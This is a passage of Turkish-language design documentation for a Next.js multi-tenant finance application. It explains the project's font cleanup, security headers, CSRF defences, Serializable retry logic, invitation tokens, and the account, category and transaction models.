"kullanıldığı" için tarayıcı iki woff2'yi indiriyor, **sıfır glif** basıyordu.

Yani ortada korunacak bir görünüm yoktu.

### Reddedilen alternatifler

- **Fontu self-host etmek** (`next/font/local` + repoya alınmış woff2). Issue'nun ilk önerisiydi
  ve build bağımlılığını gerçekten kaldırırdı, ama yukarıdaki ölçüm nedeniyle **kullanılmayan bir
  varlığı repoya taşımak** olurdu: ziyaretçi iki fontu indirmeye devam eder, ekranda hiçbir şey
  değişmezdi. Fontu gerçekten kullanmak ayrı bir görünüm kararıdır.
- **Geist'i gerçekten kullanmak** (self-host + `body`'deki `Arial` override'ını kaldırmak).
  Tutarlı bir son durum, ama bu issue bir bağımlılık temizliğidir; sitenin görünümünü
  değiştirmek onun kapsamı değildi.
- **Kabul edip kayda geçirmek** ("build ağ erişimi ister"). Riski belgeler, ortadan kaldırmaz.

### Yığın neden `Arial` ile başlıyor

Bu değişikliğin **görünüme etkisi olmaması** gerekiyordu, o yüzden önceki `body` kuralının yığını
(`Arial, Helvetica, sans-serif`) aynen korundu ve `--font-sans` olarak tanımlandı. `body` artık
sabit bir liste yerine `var(--font-sans)` kullanıyor: böylece `font-sans` utility'si ile aynı
yığına çözülür ve ikisi ayrışamaz — kaldırılan hatanın tam olarak bu ayrışma olduğu düşünülürse
kayda değer.

**Bilinen sınır / sonraki adım:** modern bir "native" yığın (`-apple-system`, `Segoe UI`,
`Roboto` ile başlayan) her platformda o platformun arayüz fontunu kullanır ve genellikle daha iyi
görünür — ama Windows'ta Arial yerine Segoe UI render eder, yani **gerçek bir görünüm
değişikliğidir** ve ayrı bir karar olarak bırakıldı.

**Gelecekte marka fontu istenirse:** `next/font/local` + repoya alınmış woff2 dosyaları
kullanılmalı ve `--font-sans` o değişkene çevrilmelidir. `next/font/google`a **dönülmemelidir** —
build zamanı ağ bağımlılığı geri gelir.

## Güvenlik Header'ları

Tüm yanıtlara (sayfalar ve `/api/*`, hata yanıtları dahil) `next.config.ts` üzerinden temel
güvenlik header'ları eklenir. Bunlar mevcut korumaların yerine geçmez — authorization
backend'de, CSRF koruması `SameSite=Lax` + CORS'a dayanır — tarayıcı tarafındaki saldırı
yüzeyini daraltır. Doğrulama: `security/http-headers-security.spec.ts`.

| Header | Değer | Neden |
| --- | --- | --- |
| `X-Content-Type-Options` | `nosniff` | Tarayıcı, Content-Type'ı tahmin ederek bir yanıtı script gibi çalıştırmaz. |
| `X-Frame-Options` | `DENY` | Clickjacking (eski tarayıcılar için). |
| `Content-Security-Policy` | `frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'` | Clickjacking (modern), `<base>` enjeksiyonu, form action hijacking, eklenti yüzeyi. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | URL'de taşınan reset/davet token'larının üçüncü taraflara sızmaması. |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=()` | Kullanılmayan güçlü tarayıcı API'leri kapatılır. |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | HTTPS zorunluluğu. HTTP üzerinden yok sayılır, lokal geliştirmeyi etkilemez. |
| `X-Powered-By` | *(kaldırıldı)* | Framework/sürüm ipucu vermenin işlevsel karşılığı yok. |

**Kapsam dışı (bilinçli):**

- **Tam CSP (`script-src`/`style-src`) yoktur.** Next.js'te güvenli bir script politikası
  nonce tabanlı olmalıdır ve nonce'lar statik config'ten değil istek başına üretilmelidir
  (bkz. `node_modules/next/dist/docs/01-app/02-guides/content-security-policy.md`). Yanlış bir
  `script-src` uygulamayı sessizce kırar; gerçek frontend (Epic 4) geldiğinde ayrı bir issue
  olarak eklenmelidir. Yukarıdaki dört direktif frontend'den bağımsızdır ve bugün güvenle
  uygulanabilir.
- **HSTS `preload` yoktur.** Preload listesine girmek alan adı genelinde, geri alınması çok zor
  bir taahhüttür; production deployment kararıyla (Issue #91) birlikte verilmelidir.

## CSRF Duruşu (Issue #28)

**Bu projede özel bir CSRF token sistemi YOKTUR ve bu bilinçli bir tercihtir.** Custom JSON API
route'ları (tenant/membership/invitation endpoint'leri) iki bağımsız tarayıcı mekanizmasıyla
korunur. Aşağıdaki iddiaların tamamı gerçek Chromium ile test edilerek kanıtlanmıştır
(`e2e/csrf-samesite.spec.ts`), varsayım değildir.

### Koruma nasıl çalışıyor

Cross-site bir istek, türüne göre iki farklı katmanda durur:

| İstek türü | Durduran mekanizma | Sunucuya ulaşır mı? |
| --- | --- | --- |
| Form POST (`urlencoded`/`text-plain`, custom header yok) | **`SameSite=Lax`** — tarayıcı session cookie'sini eklemez | Evet, ama kimliksiz → `401` |
| JSON POST, `PATCH`, `DELETE`, custom header'lı istekler | **CORS preflight** — uygulama `Access-Control-Allow-Origin` döndürmez | Hayır, hiç gönderilmez |

- Hem `authjs.session-token` hem `active-tenant` cookie'si `HttpOnly` + `SameSite=Lax` olarak
  **açıkça** set edilir (`src/lib/tenants/active-tenant.ts`; Auth.js tarafı için
  `security/signin-signout-security.spec.ts`). Öznitelik açıkça verildiği için, Chromium'un
  yalnızca *SameSite özniteliği hiç olmayan* cookie'lere uyguladığı "Lax-allowing-unsafe"
  (Lax+POST) geçici muafiyeti bu cookie'ler için geçerli değildir — test, cross-site POST'u
  session kurulduktan hemen sonra, yani o muafiyetin geçerli olacağı zaman penceresi içinde
  yapar ve cookie yine gönderilmez.
- Sunucu tarafı zaten kimliksiz state-changing isteği reddeder ve **hiçbir yan etki
  üretmez** — bkz. `security/tenant-isolation-boundaries.spec.ts` içindeki "unauthenticated
  mutation" bloğu.
- Auth.js'in kendi sign-in akışı ayrıca kendi CSRF token mekanizmasına sahiptir; ona
  dokunulmamıştır.

Test bir **kontrol grubu** içerir: aynı-site isteğin `200` dönmesi, cross-site `401`'in sebebinin
"cookie zaten geçersizdi" değil "tarayıcı cookie'yi göndermedi" olduğunu kanıtlar. Ayrıca testin
duyarlılığı doğrulanmıştır: aynı senaryo cookie `SameSite=None` yapıldığında cookie'nin cross-site
gönderildiğini ve isteğin authentication'ı GEÇTİĞİNİ gösterir — yani koruma zayıflarsa test
kırmızıya döner.

### Kabul edilen residual risk

Bu duruş mutlak değildir. Bilinçli olarak kabul edilen sınırlar:

1. **`SameSite=Lax`, top-level cross-site GET isteklerini ENGELLEMEZ.** Dolayısıyla bu koruma,
   *"state değiştiren hiçbir işlem GET ile yapılmaz"* invariant'ına dayanır. Uygulamanın kendi
   GET endpoint'lerinin (`/api/health`, `/api/auth/me`, `/api/tenants`,
   `/api/tenants/[tenantId]/members`) tamamı salt-okunurdur; bu kural `CLAUDE.md`'de zorunlu bir
   proje kuralı olarak yazılıdır ve `integration/get-side-effect-free-pattern.spec.ts` ile
   otomatik olarak zorlanır (bir GET handler'ına yazma çağrısı eklenirse test kırmızıya döner).
   Tek istisna Auth.js'in kendi `GET /api/auth/session` endpoint'idir: bu endpoint session
   cookie'sini tazeler, ancak uygulama verisini değiştirmez ve revoke edilmiş bir session'ı
   diriltemez (bkz. "Session Revocation") — kurbanı bu adrese yönlendirmek saldırgana yalnızca
   kurbanın kendi oturumunun uzatılmasını sağlar, sömürülebilir bir yan etki üretmez.
   Bu invariant kırılırsa CSRF koruması da kırılır.
2. **`SameSite` site (eTLD+1) bazlıdır, origin bazlı DEĞİLDİR.** Ele geçirilmiş veya kötü niyetli
   bir alt alan adı (`evil.example.com` → `app.example.com`) *same-site* sayılır ve cookie'yi
   gönderebilir. Alt alan adları güvenilmeyen içerik barındıracaksa bu duruş yeniden
   değerlendirilmelidir.
3. **İkinci katman (CORS), permissive bir CORS yapılandırması eklenmediği sürece geçerlidir.**
   İleride `Access-Control-Allow-Origin` (özellikle `credentials` ile birlikte) eklenirse JSON/
   `PATCH`/`DELETE` koruması ortadan kalkar ve geriye yalnızca `SameSite` kalır.
4. **SameSite desteklemeyen çok eski tarayıcılar** korunmaz.

### Ne zaman gerçek CSRF token'ı gerekir

Yukarıdaki maddelerden biri değişirse — state değiştiren bir GET gerekirse, uygulama güvenilmeyen
alt alan adlarıyla aynı site altında dağıtılırsa veya cross-origin credentialed istekler
desteklenmek zorunda kalınırsa — `SameSite` tek başına yetmez ve ayrı bir issue ile gerçek bir
CSRF token katmanı eklenmelidir.

## Eşzamanlılık: Serializable + Retry (Issue #122)

Okumaya bağlı invariant'ları (son OWNER koruması, "eski daveti iptal et + yenisini oluştur")
koruyan transaction'lar `Serializable` izolasyonda çalışır. Bu izolasyonun sözleşmesi
**"hiç hata almazsın" değildir**: PostgreSQL, iki transaction birbirini geçersiz kılacak
şekilde çakıştığında birini **serialization failure** ile reddeder (Prisma `P2034`) ve
çağıranın **yeniden denemesini** bekler.

- **Tek giriş noktası `runSerializable()`** (`src/lib/db/serializable.ts`).
  `prisma.$transaction(..., { isolationLevel: Serializable })`'ı doğrudan çağırmak retry'ı
  atlamak demektir; o durumda serialization hatası kullanıcıya **500** olarak yansır.
  Issue #122'de tam olarak bu oluyordu: eşzamanlı bir rol değişikliğinde meşru kullanıcı 500
  alıyordu. (Hata CI'da görünmüyordu çünkü `playwright.config.ts`'teki `retries: 2` onu
  maskeliyordu — yani bu bir test gürültüsü değil, **maskelenmiş bir üretim hatasıydı**.)
- **Yalnızca `P2034` yeniden denenir.** Domain hataları (NotFound, LastOwner,
  ForbiddenOwnership) ve diğer Prisma hataları (ör. `P2002`) olduğu gibi yukarı çıkar —
  kalıcı bir durumu tekrar tekrar denemek hem gecikme üretir hem de gerçek hatayı maskeler.
- **5 deneme + kademeli, sapmalı bekleme** (`attempt * 10ms` + 0-10ms rastgele). Sabit bekleme
  yetmez: çakışan istemciler aynı süre bekleyip aynı anda tekrar dener ve çakışma birebir
  tekrarlanır (thundering herd). Önceki elle yazılmış implementasyon 3 denemeydi ve ölçüldüğünde
  5 eşzamanlı rol değişikliğinde yetersiz kaldı.
- **Denemeler tükenirse `503`**, `409` **değil**: `409` bu kod tabanında iş kuralı ihlalidir
  (ör. "son OWNER düşürülemez") ve arayüz ona göre mesaj gösterir. Retry tükenmesi geçici bir
  sunucu durumudur; doğru mesaj "biraz sonra tekrar deneyin"dir.
- **`runSerializable()`'a verilen fonksiyon yeniden çalıştırılabilir olmalıdır**: transaction
  DIŞINDAKİ yan etkiler (audit log yazımı, davet e-postası) içine konmaz. DB değişiklikleri
  rollback edilebilir, gönderilmiş bir e-posta edilemez.

Kanıt: `integration/serializable-retry.spec.ts` (neyin denendiği/denenmediği, rollback
semantiği) ve `integration/membership-concurrency.spec.ts` (gerçek eşzamanlı yük; retry
kaldırılırsa kırmızıya döner).

## Tenant Davetleri (Invitations)

Bir tenant'a yeni kullanıcı davet etme akışı (`src/lib/tenants/invitation.ts`).

- **Davet oluşturma:** `POST /api/tenants/[tenantId]/invitations` (`{ email, role }`). Sadece
  `OWNER`/`ADMIN` davet oluşturabilir (`PERMISSIONS.SEND_INVITE`, Issue #12); `MEMBER` `403` alır.
  `tenantId` her zaman `requirePermission()`'ın DB'den doğruladığı trusted active tenant
  context'inden gelir (Issue #13) — URL/body'deki değerler kaynak değildir. E-posta normalize
  edilir (trim + lowercase). **Least privilege:** `updateMemberRole`'daki ("ADMIN kimseyi OWNER
  yapamaz") ile AYNI kural — sadece `OWNER`, `OWNER` rolüyle davet gönderebilir; `ADMIN`'in
  denemesi `403` ile reddedilir.
- **Duplicate pending invitation politikası:** aynı tenant + aynı email için zaten aktif
  (kullanılmamış, iptal edilmemiş) bir davet varsa, yeni davet oluşturulmadan önce eskisi
  `cancelledAt` ile geçersiz kılınır — böylece her zaman en fazla bir aktif davet bulunur ve eski
  token'ın kabul edilmesi mümkün olmaz. Bu "eskisini iptal et + yenisini oluştur" adımı, aynı
  tenant+email için eşzamanlı iki isteğe karşı Serializable bir transaction içinde yapılır (bkz.
  `src/lib/tenants/membership.ts`'teki last-OWNER korumasıyla aynı teknik); bir yazma çakışması
  oluşursa otomatik olarak yeniden denenir.
- **Üyelik bitince davetler iptal olur:** Bir üye tenant'tan çıkarıldığında (`removeMember()`), o
  üyenin O tenant için oluşturduğu bekleyen (kullanılmamış + iptal edilmemiş) davetler, üyeliğin
  silinmesiyle AYNI transaction içinde `cancelledAt` ile geçersiz kılınır. Gerekçe: aksi halde
  çıkarılan bir `ADMIN`'in daha önce gönderdiği davet 7 günlük TTL'i boyunca geçerli kalır ve
  kabul edildiğinde davetliye gerçek bir `ADMIN` üyeliği verirdi — yani içeriden birini çıkarmak,
  onun bıraktığı arka kapıyı kapatmazdı. **Rol düşürme (ör. `ADMIN` → `MEMBER`) davetlere
  KASITLI olarak dokunmaz**; yalnızca üyeliğin sona ermesi iptali tetikler. İptal edilen davet,
  kabul denemesinde diğer geçersiz durumlarla AYNI genel `400`'e düşer (yeni bilgi sızdırmaz).
- **Token güvenliği:** `PasswordResetToken` (Issue #7) ile AYNI yaklaşım — `crypto.randomBytes(32)`
  (256 bit) ile üretilir, DB'de (`TenantInvitation.tokenHash`) SADECE SHA-256 hash'i saklanır, raw
  token hiçbir zaman saklanmaz veya production loglarına yazılmaz. Token 7 gün sonra geçersiz olur
  ve tek kullanımlıktır.
- **Davet kabul etme:** `POST /api/invitations/accept` (`{ token }`). Authentication zorunludur
  (`requireUser()`); signup/login bu issue'nun kapsamında yeniden implement edilmez. Kontroller:
  token bulunuyor mu, süresi dolmuş mu, kullanılmış mı, iptal edilmiş mi (hepsi için AYNI genel
  `400` hatası — enumeration'a karşı), authenticated kullanıcının e-postası davetteki email ile
  eşleşiyor mu (`403`, e-posta kontrolü token TÜKETİLMEDEN önce yapılır ki yanlış hesap daveti
  kalıcı olarak yakmasın), kullanıcı zaten tenant member mı (`409`, duplicate membership/privilege
  escalation OLUŞTURULMAZ). Başarılı kabul, membership oluşturma + invitation'ı `usedAt` ile
  tüketme işlemini TEK bir atomic transaction içinde yapar; eşzamanlı iki kabul isteğinden yalnızca
  biri kazanır.
- Gerçek e-posta gönderimi kapsam dışıdır; `InvitationSender` interface'i
  (`src/lib/tenants/invitation-email.ts`) arkasında, `EmailSender` (şifre sıfırlama) ile AYNI
  desende minimal bir konsol/dosya tabanlı implementasyon kullanılır.

## Finansal Hesaplar (Issue #46)

İlk finansal model: `Account` (banka hesabı / kasa). Şema `prisma/schema.prisma`, iş mantığı
`src/lib/finance/account.ts`, endpoint'ler `GET/POST /api/tenants/[tenantId]/accounts` ve
`PATCH/DELETE /api/tenants/[tenantId]/accounts/[accountId]`.

### Para nasıl taşınır ve saklanır

- **DB'de `Decimal(19, 4)`**, `Float`/`number` DEĞİL (invariant #10). `number` ikili kayan
  noktadır (`0.1 + 0.2 !== 0.3`); finansal bir üründe bu kabul edilemez.
- **API sözleşmesinde string.** Hem girdi hem çıktı: `"1234.5600"`. Girdide `number`
  **reddedilir** (`400`) — bir kez `number`'a dönüşen tutar `Decimal`e çevrilse bile
  yuvarlanmış olabilir. Çıktıda dönüşüm tek bir yerde (`toView()`) yapılır ki sözleşme
  Prisma'nın JSON serileştirme davranışına bağlı kalmasın.
- **Ondalık ayırıcı yalnızca `.`**; "1.234,56" gibi yerelleştirilmiş biçimler API'nin işi
  değildir (biçimlendirme sunum katmanına aittir).
- **Negatif bakiye serbesttir**: bir hesap eksiye düşebilir, kredi kartı zaten negatif taşır.
- **Para birimi ayrı alandır** (ISO 4217, 3 harf). Doğrulama biçimseldir; tam ISO listesi bir
  bağımlılık ya da elle bakımı gereken bir tablo gerektirirdi ve çoklu kur/dönüşüm bu issue'nun
  kapsamı dışıdır.

### Yetki ve izolasyon

- **`VIEW_ACCOUNTS` ile `MANAGE_ACCOUNTS` ayrı izinlerdir.** MEMBER hesapları **görür** ama
  oluşturamaz/güncelleyemez/silemez; ADMIN ve OWNER yönetebilir. Gerekçe: finansal kayıtları
  okumak ekibin günlük işidir, hesap açmak/silmek ve bakiyeyi elle değiştirmek yönetim işidir.
- **Her sorgu `tenantScoped()` üzerinden geçer**, mutation'lar `updateMany`/`deleteMany` +
  `count === 1` ile yapılır — yalnız-ID ile `update`/`delete` yoktur. Pattern koruması:
  `integration/tenant-scope-pattern.spec.ts` (artık `account.ts`'i de kapsıyor).
- **Cross-tenant ID ile var olmayan ID aynı yanıtı alır** (`404`, aynı gövde) — enumeration
  engeli.
- Trusted `tenantId` daima `requirePermission()` context'inden gelir; body'deki `tenantId`/`id`
  alanları yok sayılır (regresyon testi: `security/account-security.spec.ts`).

### Diğer kararlar

- **`@@unique([tenantId, name])`**: aynı tenant'ta aynı isimde iki hesap olamaz. "Önce kontrol
  et sonra yaz" yarışı yerine unique constraint'e güvenilir; P2002 → `409`. Kıyas büyük/küçük
  harfe duyarlıdır (case-insensitive unique ayrı bir index/collation gerektirir).
- **`AccountType` bir Prisma enum'ıdır** (`BANK`, `CASH`): küme küçük ve kararlı, yeni tür
  eklemek migration gerektirir. (Karşılaştır: `AuditLog.action` serbest `String`'tir çünkü o
  küme sürekli büyür.)
- **Audit:** `ACCOUNT_CREATED` / `ACCOUNT_UPDATED` / `ACCOUNT_DELETED`. Güncellemede metadata
  yalnızca **hangi alanların** değiştiğini tutar, yeni değerleri değil — audit log finansal
  tutarların ikinci bir kopyası değildir.
- **Rate limit yoktur:** bu endpoint'ler authenticated ve tenant-scoped'tur; mevcut politika
  kataloğu (`src/lib/rate-limit/policies.ts`) public/pahalı endpoint'ler içindir.

### Hesap ekranı (Issue #47)

`/accounts` (`src/app/(app)/accounts/`). Aktif çalışma alanının hesaplarını listeler ve yetkili
role oluşturma formunu gösterir. `/members` ile aynı desen: URL'de `tenantId` yoktur, kaynak
aktif tenant'tır.

- **Bakiye ham string olarak gösterilir, `Intl.NumberFormat` ile DEĞİL.** Biçimlendirme değeri
  önce `Number`'a çevirmeyi gerektirir; bu, para için yasak olan kayan nokta dönüşümünü
  (invariant #10) arayüz katmanından geri getirirdi. Yerelleştirilmiş gösterim, string üzerinde
  çalışan ayrı bir yardımcı ile ele alınmalıdır — bu issue'nun kapsamı değil.
- **Boş bakiye alanı gönderilmez** (`undefined`): backend o zaman şemadaki `@default(0)`'ı
  uygular. Boş string göndermek "geçersiz tutar" dalını tetiklerdi.
- **Oluşturma formu yalnızca `MANAGE_ACCOUNTS` iznine sahip role render edilir** — bu bir
  güvenlik kontrolü değil, MEMBER'a kesin 403 alacağı bir form göstermeme tercihidir; asıl
  kontrol route'taki `requirePermission()`'dır.
- **Kapsam:** liste + oluşturma. Güncelleme/silme arayüzü bu issue'da bilerek yapılmadı;
  #130'da eklendi (bkz. "Düzenleme ve silme arayüzü").

E2E kanıtı: `e2e/accounts-ui.spec.ts` — her sonuç `GET /api/tenants/:id/accounts` ile
doğrulanır (kayıt gerçekten oluştu mu, bakiye string ve hassasiyeti korunmuş mu, hata
durumunda kayıt oluşmamış mı); MEMBER için formun hiç render edilmediği ve baypas edilirse
`403` alındığı ayrıca test edilir.

## Gelir/Gider Kategorileri (Issue #49)

İkinci finansal model: `Category` — işlemlerin (#53) sınıflandırılacağı **düz** liste. Şema
`prisma/schema.prisma`, iş mantığı `src/lib/finance/category.ts`, endpoint'ler
`GET/POST /api/tenants/[tenantId]/categories` ve
`PATCH/DELETE /api/tenants/[tenantId]/categories/[categoryId]`.

Yetki, izolasyon ve hata sözleşmesi `Account` (#46) ile **aynıdır** ve burada tekrarlanmaz;
aşağıda yalnızca bu modele özgü kararlar vardır.

### Benzersizlik anahtarı türü de içerir

`@@unique([tenantId, type, name])` — `Account`taki `@@unique([tenantId, name])`'den **bilinçli
olarak farklı**. "Diğer", "Faiz", "Kira" gibi isimler hem gelir hem gider tarafında doğal
olarak bulunur; bunları tek bir isim uzayına sıkıştırmak kullanıcıyı "Diğer (Gelir)" gibi
kaçamak isimler yazmaya zorlardı. Belirsizlik doğmaz, çünkü kategori daima bir türün
bağlamında seçilir (gider işlemine gider kategorisi).

Yarış durumu yine DB'de kapatılır: "önce aynı isim var mı diye bak, sonra yaz" deseni iki
eşzamanlı isteğin ikisini de oluşturabilirdi; unique constraint'e güvenilir ve `P2002` → `409`
çevrilir. Kıyas büyük/küçük harfe duyarlıdır (`Account` ile aynı sınır: case-insensitive
unique, ayrı bir index/collation gerektirir).

### Tür değiştirmek serbesttir

`PATCH` ile `type` güncellenebilir. Alternatif — "türü değiştirilemez, silip yeniden oluştur" —
ileride kategoriye bağlanacak işlemleri (#53) koparacağı için daha kötüdür. Tür unique
anahtarın parçası olduğundan, hedef tarafta aynı isim varsa `409` döner; bu karar da önden
okuma yerine constraint'e bırakılmıştır.

### `?type` filtresi: geçersiz değer sessizce yok sayılmaz

`GET .../categories?type=INCOME|EXPENSE` opsiyonel bir filtredir ve işlem formu içindir (gider
işlemine yalnızca gider kategorisi seçilebilmelidir). Geçersiz bir değer **`400`** alır,
sessizce yok sayılmaz: yok saymak, filtrenin uygulandığını sanan bir istemciye TÜM listeyi
döndürürdü ve bunun ilk sonucu gider işlemine gelir kategorisi seçtirmek olurdu.

Filtre `where`'e doğrudan değil, `tenantScoped()`in **üzerine** eklenir — tenant filtresinin
yerine geçemez. Bu, `integration/tenant-scope-pattern.spec.ts`'te bu modele özgü ek bir
pattern testiyle korunur (`where: { type }` yazılmasını yakalar), HTTP tarafındaki karşılığı
`security/category-security.spec.ts`'tedir.

### Yetki

`VIEW_CATEGORIES` ile `MANAGE_CATEGORIES` ayrıdır (hesaplarla aynı ayrım): kategori listesini
görmek her üyenin işidir — işlem kaydederken seçecektir; kategori açmak/yeniden
adlandırmak/silmek ise tenant'ın sınıflandırma şemasını değiştirmektir, yani yönetim işi.
MEMBER görür, ADMIN ve OWNER yönetir.

### Audit

`CATEGORY_CREATED` / `CATEGORY_UPDATED` / `CATEGORY_DELETED`. Bir kategorinin yeniden
adlandırılması veya silinmesi **geçmiş raporların anlamını değiştirir**, bu yüzden iz tutulur.
Güncellemede metadata yalnızca hangi alanların değiştiğini taşır (`Account` ile aynı gerekçe).

### Bilinen sınır: silme, kullanımda olan kategoriyi kontrol etmez

`Transaction` modeli henüz yoktur (#53). "Kullanımda olan kategori silinmek istenirse ne olur"
(engelle / işlemleri kategorisiz bırak) o modelin kararıdır ve orada verilmelidir; bugün
kategoriye bağlanan hiçbir kayıt olmadığı için koşulsuz silme doğru davranıştır. Önceden bir
koruma yazmak, dayanacağı bir ilişki olmadığından ölü kod olurdu.

Kapsam dışı bırakılan diğer iki şey: **alt kategori hiyerarşisi** (issue'da açıkça kapsam
dışı; düz liste ilk sürüm için yeterli) ve **varsayılan kategori seti ile tenant tohumlama**
(yeni bir tenant'ın hangi kategorilerle açılacağı ürün kararıdır, bu issue'nun değil).
Kategori yönetimi arayüzü #50'dir.

### Kategori ekranı (Issue #50)

`/categories` (`src/app/(app)/categories/`). Aktif çalışma alanının kategorilerini listeler ve
yetkili role oluşturma formunu gösterir. `/accounts` ile aynı desen: URL'de `tenantId` yoktur,
kaynak aktif tenant'tır; form servis fonksiyonunu değil `POST /api/.../categories`'i çağırır
(yetki ve aktif tenant tutarlılığı route seviyesindedir).

- **`?type` filtresi bu ekranda kullanılmaz.** O filtre işlem formu içindir (#53); burada
  kullanıcı kategorilerinin tamamını tek listede görür. Liste API'den türe göre sıralı
  geldiği için zaten gruplu okunur — ayrı bir filtre kontrolü eklemek bu issue'nun kapsamını
  genişletirdi.
- **`409` mesajı türü de söyler:** "Bu **türde** bu isimde bir kategori zaten var". Benzersizlik
  tenant + tür + isim üzerinden olduğu için (bkz. yukarıdaki karar), "bu isimde bir kategori
  zaten var" demek yanıltıcı olurdu — kullanıcı aynı ismi diğer türde kullanabilir.
- **Başarılı kayıttan sonra ad temizlenir, tür seçimi korunur.** Kullanıcı genellikle arka
  arkaya aynı taraftan birkaç kategori girer; türü her kayıtta "Gider"e döndürmek onu her
  seferinde yeniden seçmeye zorlardı. Formun varsayılanı da bu yüzden **Gider**'dir.
- **Oluşturma formu yalnızca `MANAGE_CATEGORIES` iznine sahip role render edilir** — bu bir
  güvenlik kontrolü değil, MEMBER'a kesin 403 alacağı bir form göstermeme tercihidir; asıl
  kontrol route'taki `requirePermission()`'dır.
- **Kapsam:** liste + oluşturma. Güncelleme/silme arayüzü bu issue'da bilerek yapılmadı;
  hesap ve işlem ekranlarıyla birlikte #130'da eklendi.

E2E kanıtı: `e2e/categories-ui.spec.ts` — her sonuç `GET /api/tenants/:id/categories` ile
doğrulanır. Aynı ismin gelir ve gider tarafında ayrı ayrı kullanılabildiği (yani #49'un
`@@unique([tenantId, type, name])` kararı) uçtan uca ayrıca kanıtlanır; MEMBER için formun hiç
render edilmediği ve baypas edilirse `403` alındığı da test edilir.

## Gelir/Gider İşlemleri (Issue #53)

Üçüncü finansal model: `Transaction` — paranın gerçekten hareket ettiği kayıt. Şema
`prisma/schema.prisma`, iş mantığı `src/lib/finance/transaction.ts`, endpoint'ler
`GET/POST /api/tenants/[tenantId]/transactions` ve
`PATCH/DELETE /api/tenants/[tenantId]/transactions/[transactionId]`.

Tenant izolasyonu, enumeration duruşu ve hata sözleşmesi `Account` (#46) ile **aynıdır** ve
burada tekrarlanmaz. Bu modeli diğer ikisinden ayıran şey tektir: bir işlem yalnızca kendi
satırını değil, **bağlı olduğu hesabın bakiyesini** de yazar. Aşağıdaki kararların hemen hepsi
bu tek gerçeğin sonucudur.

### `Account.balance` işlemlerden türetilir, ama saklanır

Bakiye her okumada işlemler toplanarak HESAPLANMAZ; `Account.balance` sütununda tutulur ve her
işlem yazımında güncellenir. Alternatif — bakiyeyi `SUM(amount)` ile anlık hesaplamak — bakiyeyi
tanım gereği doğru yapardı, ama hesap listesi büyüdükçe her sayfa açılışında tüm işlem
geçmişini taramak gerekirdi. Saklanan bakiyenin bedeli, doğruluğunun **korunması gereken bir
invariant** hâline gelmesidir; bu yüzden:

- **Kayıt ile bakiye güncellemesi daima TEK bir DB transaction'ı içindedir.** İkisinin arasında
  bir çökme, bakiyesi kayıtlarına uymayan bir hesap bırakırdı.
- **Bakiye `increment` ile kaydırılır** (`balance = balance + x` SQL'i), uygulama katmanında
  "oku, JS'te topla, geri yaz" ile DEĞİL. İkincisi iki eşzamanlı işlemde lost update üretirdi.
- Bir doğrulama başarısız olursa (yabancı hesap, uyumsuz kategori) **ne kayıt ne bakiye**
  değişir — `integration/transaction.spec.ts` bunu her hata dalında ayrıca doğrular.

### Tutar daima pozitiftir; yönü `type` taşır

`amount` için `parseMoney()`in kesin pozitif varyantı kullanılır: `0` ve negatif değerler `400`
alır. `Account.balance` negatif olabilir (hesap eksiye düşebilir) ama bir işlemin tutarı
olamaz — negatif bir `EXPENSE`, kılık değiştirmiş bir gelir olurdu ve "dönemin toplam gideri"
gibi her toplamı sessizce bozardı. Sıfır da reddedilir: bakiyeyi değiştirmeyen bir para hareketi
kayıt değil gürültüdür.

Para sözleşmesinin geri kalanı `Account` ile aynıdır: DB'de `Decimal(19, 4)`, API'de **string**,
girdide `number` reddedilir (invariant #10).

### `Serializable` YALNIZCA güncellemede — ve nedeni ölçüldü

`CLAUDE.md`, "okumaya bağlı invariant'lar için Serializable + retry" der. Buradaki üç mutation
bu tanıma **farklı** oranlarda uyar:

| İşlem | İzolasyon | Neden |
| --- | --- | --- |
| `create` | varsayılan | Hiçbir eski değer okumaz; bakiye atomik `increment` ile kayar. |
| `delete` | varsayılan | `deleteMany` + `count === 1` kapısı, eşzamanlı ikinci silmenin bakiyeyi ikinci kez geri almasını imkânsız kılar. |
| `update` | **Serializable + retry** | Bakiye düzeltmesi işlemin ESKİ tutarını okumaya dayanır ("önceki etkiyi geri al, yenisini uygula"). |

Her yere Serializable koymak kolay olurdu ama her eşzamanlı kayıt için gereksiz yeniden deneme
üretirdi. Update'teki ihtiyaç varsayım değil, **ölçüm**: `runSerializable()` düz bir
`$transaction` ile değiştirildiğinde `integration/transaction.spec.ts`'teki eşzamanlılık testi
üç denemenin üçünde de kırmızıya döndü ve bakiye tam da tarif edilen şekilde bozuldu
(son tutar `700` iken bakiye `-1800`).

O testin **altı** eşzamanlı istek kullanması da bir ölçümün sonucudur: iki istekle okumalar
pratikte iç içe geçmiyor ve test, Serializable kaldırılsa bile yeşil kalıyordu — yani hiçbir şey
kanıtlamıyordu. (Aynı tuzak `membership-concurrency.spec.ts`'te de notlanmıştı.)

Denemeler tükenirse yanıt **`503`**'tür, `409` değil: geçici bir yazma çakışması bir iş kuralı
ihlali değildir (bkz. "Eşzamanlılık: Serializable + Retry").

### Kategorinin türü işlemin türüyle eşleşmek zorunda

Bir gider işlemine gelir kategorisi bağlanamaz (`400`). Bu, #49'un `@@unique([tenantId, type,
name])` kararının doğrudan devamıdır: kategori daima bir türün bağlamında seçilir, aksi hâlde
tür bazlı her rapor anlamsızlaşırdı.

Bunun daha ince bir sonucu: **`type` güncellenirken mevcut kategori yeniden kontrol edilir.**
Kategori hiç değişmese bile, işlemin yönü değiştiğinde eski kategori yanlış tarafta kalmış
olabilir; böyle bir `PATCH` sessizce geçseydi kayıt tutarsız kalırdı. Kullanıcı ya kategoriyi de
değiştirmeli ya da `categoryId: null` ile kaldırmalıdır.

"Kategori yok" (`404`) ile "kategori yanlış türde" (`400`) **farklı** yanıtlar alır ve bu bilgi
sızdırmaz: her iki kayıt da çağıranın kendi tenant'ındadır. Yabancı bir tenant'ın kategorisi ise
hiç var olmayan bir kategoriyle **aynı** `404`'ü alır.

### Silme kuralları: hesap engeller, kategori kategorisiz bırakır

Issue #49'un bilerek açık bıraktığı karar burada verildi ve ikisi **kasten farklıdır**:

- **İşlemi olan hesap silinemez** (`409`, `onDelete: NoAction`). Cascade reddedildi: bir hesabı
  silmek, o hesabın tüm finansal geçmişini sessizce yok ederdi. Kullanıcının önce işlemleri
  silmesi gerekir — bu, geri alınamaz bir kaybı bilinçli bir eyleme dönüştürür.
